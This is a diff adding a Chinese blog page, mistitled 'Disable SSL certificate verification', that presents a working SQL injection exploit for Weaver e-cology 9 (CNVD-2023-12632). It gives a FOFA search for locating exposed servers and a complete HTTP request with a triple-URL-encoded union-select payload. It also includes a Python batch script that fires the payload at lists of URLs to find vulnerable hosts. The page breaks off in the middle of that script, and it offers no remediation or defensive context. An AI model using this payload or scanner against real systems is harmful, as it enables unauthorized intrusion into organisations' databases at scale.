@@ -1,0 +1,709 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <link rel="icon" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="泛微e-cology9_SQL注入-CNVD-2023-12632影响版本1泛微e-cology V9&lt;10.56  fofa1app&#x3D;&quot;泛微-协同商务系统&quot;  poc12345678POST &#x2F;mobile&#x2F;%20&#x2F;plugin&#x2F;browser.jsp HTTP&#x2F;1.1Host: ip:portUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Disable SSL certificate verification">
+<meta property="og:url" content="http://example.com/1970/01/01/POC/%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="泛微e-cology9_SQL注入-CNVD-2023-12632影响版本1泛微e-cology V9&lt;10.56  fofa1app&#x3D;&quot;泛微-协同商务系统&quot;  poc12345678POST &#x2F;mobile&#x2F;%20&#x2F;plugin&#x2F;browser.jsp HTTP&#x2F;1.1Host: ip:portUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/wy876/POC/assets/139549762/ac471b51-419f-4e7e-bb29-6eadd24a8ec1">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-27T02:41:21.026Z">
+<meta property="article:author" content="Ninja">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://github.com/wy876/POC/assets/139549762/ac471b51-419f-4e7e-bb29-6eadd24a8ec1">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Disable SSL certificate verification - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-th-large"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" target="_self">
+                <i class="iconfont icon-book"></i>
+                <span>漏洞知识库</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>在线工具</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Disable SSL certificate verification"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="1970-01-01 08:00" pubdate>
+          1970年1月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Disable SSL certificate verification</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="泛微e-cology9-SQL注入-CNVD-2023-12632"><a href="#泛微e-cology9-SQL注入-CNVD-2023-12632" class="headerlink" title="泛微e-cology9_SQL注入-CNVD-2023-12632"></a>泛微e-cology9_SQL注入-CNVD-2023-12632</h2><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">泛微e-cology V9&lt;10.56<br></code></pre></td></tr></table></figure>
+
+<h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;泛微-协同商务系统&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/mobile/%20/plugin/browser.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ip:port<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>649<br><br><span class="language-apache"><span class="hljs-attribute">isDis</span>=<span class="hljs-number">1</span>&amp;browserTypeId=<span class="hljs-number">269</span>&amp;keyword=%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span></span><br></code></pre></td></tr></table></figure>
+<p>payload需要经过三次url编码，文末附tamper脚本地址</p>
+<p><img src="https://github.com/wy876/POC/assets/139549762/ac471b51-419f-4e7e-bb29-6eadd24a8ec1" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> termcolor <span class="hljs-keyword">import</span> colored<br><span class="hljs-keyword">import</span> signal<br><br><span class="hljs-comment"># Disable SSL certificate verification</span><br>requests.packages.urllib3.disable_warnings()<br><br>output_file = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 全局变量</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_url</span>(<span class="hljs-params">url, output=<span class="hljs-literal">None</span></span>):<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span><br>    &#125;<br>    proxies = &#123;<br>        <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>,<br>        <span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span><br>    &#125;<br><br>    data = &#123;<br>        <span class="hljs-string">&quot;isDis&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;browserTypeId&quot;</span>: <span class="hljs-string">&quot;269&quot;</span>,<br>        <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%32%37%25%32%62%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%39%25%32%62%25%32%37&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        modified_url = url + <span class="hljs-string">&#x27;/mobile/%20/plugin/browser.jsp&#x27;</span><br>        response = requests.post(modified_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">3</span>)<br>        content = response.text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show2&quot;</span> <span class="hljs-keyword">in</span> content:<br>            result = colored(url + <span class="hljs-string">&quot; 存在&quot;</span>, <span class="hljs-string">&#x27;red&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> output:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> file:  <span class="hljs-comment"># 以追加模式打开文件</span><br>                    file.write(url + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>            <span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 即时打印结果</span><br>        <span class="hljs-keyword">else</span>:<br>            result = url + <span class="hljs-string">&quot; 不存在&quot;</span><br>            <span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 即时打印结果</span><br><br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 不进行任何操作，直接请求下一个URL</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_urls_from_file</span>(<span class="hljs-params">filename, output=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span 